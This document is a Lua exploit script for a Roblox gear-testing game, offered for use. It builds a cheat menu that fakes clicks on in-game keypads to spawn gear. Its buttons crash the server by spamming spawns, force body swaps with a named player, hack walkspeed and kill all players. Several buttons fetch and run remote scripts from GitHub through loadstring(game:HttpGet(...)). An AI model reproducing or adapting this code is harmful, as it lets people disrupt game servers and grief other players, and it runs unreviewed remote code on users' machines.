pcall(function()
    function typegear(inputValue, teleportPlayer)
        -- Default teleportPlayer to true if not provided
        teleportPlayer = teleportPlayer == nil and true or teleportPlayer
    
        -- Select a random keypad from the found keypads
        local foundKeypads = {} -- Make sure to populate this with your keypads beforehand
        for _, object in ipairs(game.Workspace:GetDescendants()) do
            if object:IsA("Model") and object.Name == "Gear Machine" then
                local keypad = object:FindFirstChild("KeyPad") -- Adjust "Keypad" if needed
                if keypad then
                    table.insert(foundKeypads, keypad)
                end
            end
        end
    
        if #foundKeypads == 0 then
            warn("No keypads found.")
            return
        end
    
        local randomKeypad = foundKeypads[math.random(1, #foundKeypads)]
        local lSpawn = randomKeypad.Parent.Door
    
        -- Check if teleportPlayer is true
        if teleportPlayer and lSpawn and lSpawn:IsA("BasePart") then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            
            if humanoidRootPart then
                -- Save the player's original position
                local originalPosition = humanoidRootPart.CFrame
    
                -- Teleport to the keypad's lSpawn
                humanoidRootPart.CFrame = lSpawn.CFrame
    
                -- Return to original position after 0.2 seconds
                task.delay(0.2, function()
                    humanoidRootPart.CFrame = originalPosition
                end)
            else
                warn("HumanoidRootPart not found.")
                return
            end
        end
    
        -- Simulate typing the input value on the random keypad
        for i = 1, #inputValue do
            local buttonName = "B" .. inputValue:sub(i, i) -- Extract each character
            local button = randomKeypad:FindFirstChild(buttonName) -- Find the button by name
    
            if button then
                local clickDetector = button:FindFirstChild("ClickDetector") -- Adjust "RangeC" if needed
    
                if clickDetector then
                    fireclickdetector(clickDetector) -- Fire the click detector
                    print("Clicked button '" .. buttonName .. "' on keypad: " .. randomKeypad.Name)
                else
                    warn("Click detector 'RangeC' not found in button " .. buttonName)
                end
            else
                warn("Button named '" .. buttonName .. "' not found in the keypad.")
            end
        end
    
        -- Click the Enter button
        local enterButton = randomKeypad:FindFirstChild("Enter")
        if enterButton then
            local enterClickDetector = enterButton:FindFirstChild("ClickDetector")
            if enterClickDetector then
                fireclickdetector(enterClickDetector)
                print("Clicked 'Enter' button on keypad: " .. randomKeypad.Name)
            else
                warn("Click detector 'RangeC' not found in Enter button.")
            end
        else
            warn("'Enter' button not found in the keypad.")
        end
    
        -- Clear the keypad
        local clearButton = randomKeypad:FindFirstChild("Clear")
        if clearButton then
            local clearClickDetector = clearButton:FindFirstChild("ClickDetector")
            if clearClickDetector then
                wait(0.1)
                fireclickdetector(clearClickDetector)
                print("Clicked 'Clear' button on keypad: " .. randomKeypad.Name)
            else
                warn("Click detector 'RangeC' not found in Clear button.")
            end
        else
            warn("'Clear' button not found in the keypad.")
        end
    end
    local function swapWithUser(partialUsername)
        local Players = game:GetService("Players")
        local localPlayer = Players.LocalPlayer
    
        -- Find the target player by partial or case-insensitive username
        local targetPlayer = nil
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower():find(partialUsername:lower()) then
                targetPlayer = player
                break
            end
        end
    
        -- Check if the target player was found
        if targetPlayer and targetPlayer.Character then
            local args = {
                [1] = targetPlayer.Character
            }
            -- Fire the swap event
            localPlayer.Character.BodySwapPotion.SwapWith:FireServer(unpack(args))
            print("Swapped with " .. targetPlayer.Name)
        else
            print("Player not found or invalid target.")
        end
    end
    
    -- god save our souls, for how bad i laid the code out :(
    
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/shidemuri/scripts/main/ui_lib.lua"))()
    local Pendulum = Library:New("test all of robloxs gear fucker")
    
    local gearwall = Pendulum:NewTab("gear spawning")
    
    local gearwall2 = Pendulum:NewTab("model stuff")
    local gearwall3 = Pendulum:NewTab("universal stuff")
    local gearwall4 = Pendulum:NewTab("game breaking shit")
    
    local gearwall6 = Pendulum:NewTab("walkspeed/other stuff")
    -- i give up on organizing these sections
    gearwall4:NewButton("crash server (beta)", "mreow", function()
        while task.wait() do
        typegear("6418277837")
        end
            end)
    -- gear spawning
    gearwall6:NewButton("get body swap gear", "mreow", function()
    typegear("78730532")
    
        end)
      gearwall6:NewButton("green sword exploit", "mreow", function()
  while wait() do
      -- Save the tools currently equipped by the player
      local currentTools = {}  -- Table to track current tools (if needed later)
  
      -- Call typegear with the ID
      typegear("80661504")
  
      -- Try to get the tool and wait up to 2 seconds
      local chartreusePeriastron
      local success, err = pcall(function()
          chartreusePeriastron = game:GetService("Players").LocalPlayer.Character:WaitForChild("ChartreusePeriastron", 2)
      end)
  
      -- If the tool wasn't found in time or an error occurred
      if not success or not chartreusePeriastron then
          print("Tool not found in time or error occurred, rerunning typegear.")
          -- Rerun the typegear function
          typegear("80661504")
          continue  -- Skip the rest of the loop and retry immediately
      end
  
      -- Proceed with the tool if it's found
      local args = {
          [1] = Enum.KeyCode.Q
      }
  
      -- Fire the remote server event (assuming it exists on the tool)
      chartreusePeriastron.Remote:FireServer(unpack(args))
  
      -- Destroy the ChartreusePeriastron tool after firing the server event
      chartreusePeriastron:Destroy()
  
      -- Re-equip the tools that were equipped before calling typegear
      -- (You may need to restore the tools here if required)
  
      -- Wait 10 seconds before the loop runs again
      wait(10)
  end
  
  
        end)
  
    local customid2 = gearwall6:NewTextBar("username", ":D")
    gearwall6:NewButton("body swap (equip body swap gear)", "mreow", function()
    
    swapWithUser(customid2.Text)
    end)
      local walkspeed = gearwall6:NewTextBar("walkspeed number", ":D")
    gearwall6:NewButton("set walkspeed", "mreow", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkspeed.Text
    end)
      
    gearwall6:NewButton("set perm walkspeed", "mreow", function()
          while task.wait() do
            
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkspeed.Text
          end
    end)
      
     gearwall:NewButton("reset player", ":3", function()
    game.Players.LocalPlayer.Character.Head:Destroy()
  
    end)
    gearwall:NewButton("Delete All Ur Tools", ":3", function()
    game.Players.LocalPlayer.Backpack:ClearAllChildren()
   local player = game.Players.LocalPlayer
  local character = player.Character
  
  if character then
      for _, child in pairs(character:GetChildren()) do
          if child:IsA("Tool") then
              child:Destroy()
          end
      end
  end
  
    end)
      
        gearwall:NewButton("delete tools on respawn", ":3", function()
           game.Players.LocalPlayer.Backpack:ClearAllChildren()
   local player = game.Players.LocalPlayer
  local character = player.Character
  
  if character then
      for _, child in pairs(character:GetChildren()) do
          if child:IsA("Tool") then
              child:Destroy()
          end
      end
  end
  
           game.Players.LocalPlayer.CharacterAdded:Connect(function()
              wait(0.2)
    game.Players.LocalPlayer.Backpack:ClearAllChildren()
   local player = game.Players.LocalPlayer
  local character = player.Character
  
  if character then
      for _, child in pairs(character:GetChildren()) do
          if child:IsA("Tool") then
              child:Destroy()
          end
      end
  end
  end)
    end)
      gearwall:NewButton("invis (key is t)", ":3", function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Sakupenny/Universal-R6-Invis/refs/heads/main/Main.lua"))()
        end)
  local customid = gearwall:NewTextBar("gear id", ":D")
    gearwall:NewButton("spawn gear", "mreow", function()
    typegear(customid.Text)
          startgearid = customid.Text
    end)
        gearwall:NewButton("add to starter gear", "mreow", function()
    game.Players.LocalPlayer.CharacterAdded:Connect(function()
              wait(0.2)
      typegear(startgearid)
  end)
  
    end)
    gearwall:NewButton("Icedagger", ":3", function()
    typegear("83704165")
    end)
      gearwall:NewButton("airstrike", ":3", function()
    typegear("88885539")
    end)
        gearwall:NewButton("rainbow sword", ":3", function()
    typegear("159229806")
    end)
         gearwall:NewButton("stop hitting yourself", ":3", function()
    typegear("91360104")
    end)
      
      
      gearwall:NewButton("white sword", ":3", function()
    typegear("108158379")
    end)
         gearwall:NewButton("whoopie cushoin", ":3", function()
    typegear("31532496")
    end)
      
      gearwall:NewButton("egg bomb", ":3", function()
    typegear("248394062")
    end)
      
      gearwall:NewButton("Subspace Tripmine", ":3", function()
    typegear("11999247")
    end)
  gearwall:NewButton("Hedgehog Cannon", ":3", function()
    typegear("60357972")
    end)
      gearwall:NewButton("anime sword", ":3", function()
    typegear("71037101")
    end)
       gearwall:NewButton("vamp sword", ":3", function()
    typegear("94794847")
    end)
      
     gearwall:NewButton("Scroll", ":3", function()
    typegear("125013830")
    end)
    gearwall:NewButton("Green Sword", ":3", function()
    typegear("80661504")
    end)
       gearwall:NewButton("Rainbow Carpet", ":3", function()
    typegear("225921000")
    end)
    -- model spawning 
      
    gearwall2:NewButton("Easter Zombie", ":3", function()
    typegear("24673922", false)
    end)
      gearwall2:NewLabel("Modules!")
     gearwall2:NewButton("Emote Bar", ":3", function()
    typegear("11337892497", false)
    end)
        gearwall2:NewButton("Friend Locator", "lets you teleport to ur friends", function()
    typegear("11338008960", false)
    end)
           gearwall2:NewButton("spawn with friends", ":3", function()
    typegear("11338113281", false)
    end)
              gearwall2:NewButton("selfie mode", ":3", function()
    typegear("11338094218", false)
    end)
                 gearwall2:NewButton("Profile Card", ":3", function()
    typegear("11338070099", false)
    end)
     
                     gearwall2:NewButton("neck breaker", ":3", function()
    typegear("11338101145", false)
    end)
      
                         gearwall2:NewButton("photo booth", ":3", function()
    typegear("11338043256", false)
    end)  
    -- universal
      
    gearwall3:NewButton("inf yeild", ":3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end)
         
    gearwall3:NewButton("rejoin game", ":3", function()
    local teleportService = game:GetService("TeleportService")
    local placeId = game.PlaceId -- Current game's Place ID
    local jobId = game.JobId -- Current server's Job ID
    
    teleportService:TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
            
    end)
    -- game breaking shit
  
        
    gearwall:NewButton("Sword Kill All (auto gives icedagger)", ":3", function()
           typegear("83704165")
  wait(0.1)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/zephyr10101/sword-kill-all/main/script'))()
    end)
        gearwall:NewButton("floor glitch starterpack", ":3", function()
          typegear("110789105")
          wait(0.3)
          typegear("112593662")
    end)
    -- spamming to be done
  
    end)
    
